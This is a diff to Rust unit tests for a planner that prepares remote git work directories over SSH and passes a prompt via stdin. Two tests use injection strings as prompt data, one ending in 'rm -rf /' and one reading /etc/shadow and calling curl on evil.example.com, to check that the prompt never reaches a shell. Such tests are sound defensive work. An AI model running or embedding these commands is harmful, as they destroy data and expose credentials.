@@ -25,6 +25,19 @@ impl<T> TestOptionExt<T> for Option<T> {
     }
 }
 
+trait TestResultExt<T> {
+    fn value_or_panic(self, context: &str) -> T;
+}
+
+impl<T, E: std::fmt::Debug> TestResultExt<T> for Result<T, E> {
+    fn value_or_panic(self, context: &str) -> T {
+        match self {
+            Ok(value) => value,
+            Err(error) => panic!("{context}: {error:?}"),
+        }
+    }
+}
+
 /// Standard work dir used by the planner tests.
 const PLAN_WORK_DIR: &str = "/home/acoliver/work";
 
@@ -76,15 +89,17 @@ fn local_target_when_enabled_but_host_missing() {
 #[test]
 fn plan_uses_ssh_t_not_tt() {
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Git,
-        is_dirty: false,
-        origin_mismatch: false,
-        prompt: "do the work",
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: Some(&identity()),
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Git,
+            is_dirty: false,
+            origin_mismatch: false,
+            prompt: "do the work",
+        })
+        .value_or_panic("plan");
     assert!(!ops.is_empty());
     for op in &ops {
         assert!(
@@ -103,15 +118,17 @@ fn plan_uses_ssh_t_not_tt() {
 #[test]
 fn plan_targets_remote_host_user() {
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Git,
-        is_dirty: false,
-        origin_mismatch: false,
-        prompt: "do the work",
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: Some(&identity()),
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Git,
+            is_dirty: false,
+            origin_mismatch: false,
+            prompt: "do the work",
+        })
+        .value_or_panic("plan");
     assert!(!ops.is_empty());
     for op in &ops {
         assert!(
@@ -125,15 +142,17 @@ fn plan_targets_remote_host_user() {
 #[test]
 fn plan_applies_run_as_user() {
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Git,
-        is_dirty: false,
-        origin_mismatch: false,
-        prompt: "do the work",
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: Some(&identity()),
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Git,
+            is_dirty: false,
+            origin_mismatch: false,
+            prompt: "do the work",
+        })
+        .value_or_panic("plan");
     // run_as_user=acoliver differs from login_user=ubuntu → every command
     // is wrapped in `sudo -n su - acoliver -c`.
     for op in &ops {
@@ -155,15 +174,17 @@ fn plan_applies_run_as_user() {
 fn plan_prompt_transferred_via_stdin_not_shell() {
     let adversarial = "'; rm -rf /; echo '";
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Git,
-        is_dirty: false,
-        origin_mismatch: false,
-        prompt: adversarial,
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: Some(&identity()),
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Git,
+            is_dirty: false,
+            origin_mismatch: false,
+            prompt: adversarial,
+        })
+        .value_or_panic("plan");
     // The final op writes the prompt via stdin.
     let prompt_op = ops
         .iter()
@@ -189,15 +210,17 @@ fn plan_does_not_create_local_workdir() {
         .join("target/tmp/issue_prep_should_not_create_this");
     let _ = std::fs::remove_dir_all(&local_marker);
     let planner = RemotePrepPlanner::new(remote_settings());
-    let _ops = planner.plan(&PlanInputs {
-        work_dir: &local_marker,
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Git,
-        is_dirty: false,
-        origin_mismatch: false,
-        prompt: "prompt",
-    });
+    let _ops = planner
+        .plan(&PlanInputs {
+            work_dir: &local_marker,
+            identity: Some(&identity()),
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Git,
+            is_dirty: false,
+            origin_mismatch: false,
+            prompt: "prompt",
+        })
+        .value_or_panic("plan");
     assert!(
         !local_marker.exists(),
         "remote planner must not create local directories"
@@ -207,15 +230,17 @@ fn plan_does_not_create_local_workdir() {
 #[test]
 fn plan_dirty_stop_emits_no_cleanup() {
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Git,
-        is_dirty: true,
-        origin_mismatch: false,
-        prompt: "prompt",
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: Some(&identity()),
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Git,
+            is_dirty: true,
+            origin_mismatch: false,
+            prompt: "prompt",
+        })
+        .value_or_panic("plan");
     // Dirty + Stop: the planner short-circuits with NO operations at all —
     // no reset/clean, no checkout, no prompt write. Assert emptiness directly
     // (not a vacuous `.all()`) so an accidental no-op/log op would be caught.
@@ -228,15 +253,17 @@ fn plan_dirty_stop_emits_no_cleanup() {
 #[test]
 fn plan_dirty_discard_emits_cleanup_then_prep() {
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Discard,
-        presence: WorkdirPresence::Git,
-        is_dirty: true,
-        origin_mismatch: false,
-        prompt: "prompt",
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: Some(&identity()),
+            policy: DirtyPolicy::Discard,
+            presence: WorkdirPresence::Git,
+            is_dirty: true,
+            origin_mismatch: false,
+            prompt: "prompt",
+        })
+        .value_or_panic("plan");
     // Discard: reset --hard + clean -fd first, then checkout, then prompt.
     let reset_idx = ops
         .iter()
@@ -257,15 +284,17 @@ fn plan_dirty_discard_emits_cleanup_then_prep() {
 #[test]
 fn plan_clone_when_missing() {
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Absent,
-        is_dirty: false,
-        origin_mismatch: false,
-        prompt: "prompt",
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: Some(&identity()),
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Absent,
+            is_dirty: false,
+            origin_mismatch: false,
+            prompt: "prompt",
+        })
+        .value_or_panic("plan");
     assert!(
         ops.iter()
             .any(|op| op.ssh_argv.iter().any(|a| a.contains("git clone"))),
@@ -288,15 +317,17 @@ fn plan_absent_without_identity_emits_no_ops() {
     // ops — it must not plan checkout/prompt-write operations against a
     // path that was never created.
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: None,
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Absent,
-        is_dirty: false,
-        origin_mismatch: false,
-        prompt: "prompt",
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: None,
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Absent,
+            is_dirty: false,
+            origin_mismatch: false,
+            prompt: "prompt",
+        })
+        .value_or_panic("plan");
     assert!(
         ops.is_empty(),
         "absent workdir with no identity must emit no ops: {ops:?}"
@@ -308,15 +339,17 @@ fn plan_https_url_regardless_of_remote_enabled() {
     // Remote is enabled but clone URL must still be HTTPS (no SSH
     // inference from remote.enabled).
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Absent,
-        is_dirty: false,
-        origin_mismatch: false,
-        prompt: "prompt",
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: Some(&identity()),
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Absent,
+            is_dirty: false,
+            origin_mismatch: false,
+            prompt: "prompt",
+        })
+        .value_or_panic("plan");
     let clone_op = ops
         .iter()
         .find(|op| op.ssh_argv.iter().any(|a| a.contains("git clone")))
@@ -342,15 +375,17 @@ fn plan_origin_mismatch_short_circuits() {
     // PlanInputs with origin_mismatch=true must short-circuit: no
     // checkout/pull/prompt op planned, mirroring Dirty+Stop.
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Git,
-        is_dirty: false,
-        origin_mismatch: true,
-        prompt: "prompt",
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: Some(&identity()),
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Git,
+            is_dirty: false,
+            origin_mismatch: true,
+            prompt: "prompt",
+        })
+        .value_or_panic("plan");
     assert!(
         ops.is_empty(),
         "origin mismatch must short-circuit with no ops: {ops:?}"
@@ -414,6 +449,34 @@ fn plan_force_reclone_resolves_url_before_rm() {
     );
 }
 
+#[test]
+fn plan_not_git_is_a_hard_error_not_empty() {
+    // An existing path that is NOT a git worktree is a hard error in the live
+    // runner. The planner must encode that as Err (mirroring the runner),
+    // NOT silently emit an empty plan, so a planner/runner divergence would
+    // be caught by tests.
+    let planner = RemotePrepPlanner::new(remote_settings());
+    let result = planner.plan(&PlanInputs {
+        work_dir: Path::new(PLAN_WORK_DIR),
+        identity: Some(&identity()),
+        policy: DirtyPolicy::Stop,
+        presence: WorkdirPresence::NotGit,
+        is_dirty: false,
+        origin_mismatch: false,
+        prompt: "prompt",
+    });
+    assert!(result.is_err(), "NotGit must be a hard error: {result:?}");
+    let err = match result {
+        Err(reason) => reason,
+        Ok(ops) => panic!("expected Err, got ops: {ops:?}"),
+    };
+    // The static reason mentions the non-git-worktree condition.
+    assert!(
+        err.contains("not a git worktree"),
+        "error must explain non-git worktree: {err}"
+    );
+}
+
 // ── Target-aware PR prompt writing (reuses write_prompt_to_target) ──────
 
 /// A remote PR prompt write plans `ssh -T` with prompt bytes via stdin,
@@ -424,15 +487,17 @@ fn plan_force_reclone_resolves_url_before_rm() {
 fn pr_prompt_remote_plan_transfers_prompt_via_stdin_not_shell() {
     let adversarial = "'; cat /etc/shadow; echo '\n$(curl evil.example.com)";
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: Some(&identity()),
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Git,
-        is_dirty: false,
-        origin_mismatch: false,
-        prompt: adversarial,
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: Some(&identity()),
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Git,
+            is_dirty: false,
+            origin_mismatch: false,
+            prompt: adversarial,
+        })
+        .value_or_panic("plan");
     // The final op writes the prompt via stdin.
     let prompt_op = ops
         .iter()
@@ -469,15 +534,17 @@ fn pr_prompt_remote_plan_transfers_prompt_via_stdin_not_shell() {
 #[test]
 fn pr_prompt_remote_target_is_correct_ssh_t_host() {
     let planner = RemotePrepPlanner::new(remote_settings());
-    let ops = planner.plan(&PlanInputs {
-        work_dir: Path::new(PLAN_WORK_DIR),
-        identity: None,
-        policy: DirtyPolicy::Stop,
-        presence: WorkdirPresence::Git,
-        is_dirty: false,
-        origin_mismatch: false,
-        prompt: "PR prompt",
-    });
+    let ops = planner
+        .plan(&PlanInputs {
+            work_dir: Path::new(PLAN_WORK_DIR),
+            identity: None,
+            policy: DirtyPolicy::Stop,
+            presence: WorkdirPresence::Git,
+            is_dirty: false,
+            origin_mismatch: false,
+            prompt: "PR prompt",
+        })
+        .value_or_panic("plan");
     let prompt_op = ops
         .iter()
         .find(|op| op.stdin_prompt.is_some())
